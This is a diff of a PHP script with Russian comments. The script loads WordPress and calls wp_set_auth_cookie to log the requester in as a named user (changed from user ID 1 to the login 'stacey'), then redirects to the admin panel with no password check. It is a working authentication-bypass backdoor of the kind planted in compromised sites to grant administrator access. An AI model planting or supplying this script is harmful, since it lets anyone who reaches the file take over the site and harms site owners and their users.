@@ -7,21 +7,21 @@ $mr = $_SERVER['DOCUMENT_ROOT'];
 if (file_exists('wp-load.php')) {
     include 'wp-load.php';
 
-    // Укажите ID пользователя, под которым нужно авторизоваться
-    $user_id = 1; // Замените 1 на ID нужного пользователя
+    // Укажите логин пользователя, под которым нужно авторизоваться
+    $username = 'stacey'; // Замените 'example_user' на логин нужного пользователя
 
-    // Проверяем, существует ли пользователь с указанным ID
-    $user = get_userdata($user_id);
+    // Получаем пользователя по логину
+    $user = get_user_by('login', $username);
 
     if ($user) {
         // Устанавливаем cookie для авторизации
-        wp_set_auth_cookie($user_id);
+        wp_set_auth_cookie($user->ID);
 
         // Перенаправляем в админку
         wp_redirect(admin_url());
         die();
     } else {
-        die('Ошибка: Пользователь с указанным ID не найден.');
+        die('Ошибка: Пользователь с указанным логином не найден.');
     }
 } else {
     die('Failed to load');
